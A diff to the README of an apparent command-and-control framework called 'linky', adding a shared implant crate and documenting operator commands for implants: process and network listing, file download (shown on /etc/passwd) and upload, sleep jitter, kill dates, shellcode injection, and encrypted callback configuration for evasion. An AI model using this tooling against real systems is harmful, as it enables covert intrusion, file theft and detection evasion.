@@ -35,7 +35,7 @@ For full documentation (native install, etc.), continue reading below...
 
 ## Architecture
 
-Cargo workspace with 4 crates:
+Cargo workspace with 5 crates:
 
 ```
 linky/
@@ -49,10 +49,11 @@ linky/
 │       ├── tasks.rs        # Per-link task queue
 │       ├── cli.rs          # Interactive CLI (rustyline)
 │       └── generate.rs     # Implant builder (invokes cargo)
-└── links/
-    ├── windows/            # Windows implant  → link-windows.exe
-    ├── linux/              # Linux implant    → link-linux
-    └── osx/                # macOS implant    → link-osx
+├── links/
+│   ├── common/             # Shared code for implants (HTTP client, encryption)
+│   ├── windows/            # Windows implant  → link-windows.exe
+│   ├── linux/              # Linux implant    → link-linux
+│   └── osx/                # macOS implant    → link-osx
 ```
 
 ### C2 Protocol (3 stages)
@@ -241,6 +242,12 @@ link-1> cd /tmp
 link-1> pwd
 link-1> pid
 link-1> info
+link-1> ps
+link-1> netstat
+link-1> download /etc/passwd
+link-1> upload local_file.txt /tmp/remote_file.txt
+link-1> sleep 10 20
+link-1> killdate 2024-12-31
 link-1> back
 ```
 
@@ -251,6 +258,15 @@ link-1> powershell Get-Process
 link-1> integrity
 link-1> inject <pid> <shellcode_base64>
 ```
+
+**New Phase 2 Commands:**
+- `info` - Comprehensive system information (OS, CPU, memory, network, etc.)
+- `ps` - List running processes with details
+- `netstat` - List network connections
+- `download <path>` - Download file from implant
+- `upload <local> <remote>` - Upload file to implant
+- `sleep <seconds> [jitter%]` - Configure sleep interval with optional jitter
+- `killdate <date>` - Set automatic exit date (YYYY-MM-DD or timestamp)
 
 ---
 
@@ -368,6 +384,41 @@ podman run -it --rm \
 ---
 
 ## Recent Improvements
+
+### Phase 2 Implementation (Complete ✅)
+
+**File Operations**
+- `download <remote_path>` - Download files from implant to server
+- `upload <local_path> <remote_path>` - Upload files from server to implant
+- Base64 encoding/decoding for secure file transfer
+
+**System Information**
+- Enhanced `info` command with comprehensive system details
+- Linux: OS version, kernel, CPU, memory, disks, network, uptime
+- Windows: System info, CPU, memory, network adapters
+
+**Process Management**
+- `ps` command - List running processes with PID, PPID, user, and command
+- Linux: Direct `/proc` parsing for detailed process information
+- Windows: `tasklist` command parsing with CSV output
+
+**Network Monitoring**
+- `netstat` command - List network connections
+- Linux: Parses `/proc/net/tcp`, `/proc/net/udp`, `/proc/net/tcp6`, `/proc/net/udp6`
+- Windows: `netstat -ano` command parsing
+- Shows protocol, local/remote addresses, state, and process info
+
+**Operational Security**
+- `sleep <seconds> [jitter_percent]` - Configurable sleep interval with optional jitter
+- `killdate <date>` - Set automatic exit date (YYYY-MM-DD or timestamp)
+- AES-256-GCM encryption for embedded configuration
+- Runtime decryption of callback addresses
+
+**Code Quality**
+- **Code Factorization**: Created `link-common` crate for shared functionality
+- HTTP client, encryption functions, and wire types moved to common crate
+- ~150 lines of duplicate code eliminated
+- Improved maintainability and consistency
 
 ### UI/UX Enhancements
 - **Cleaner Output**: Separated UI messages from logs for better readability
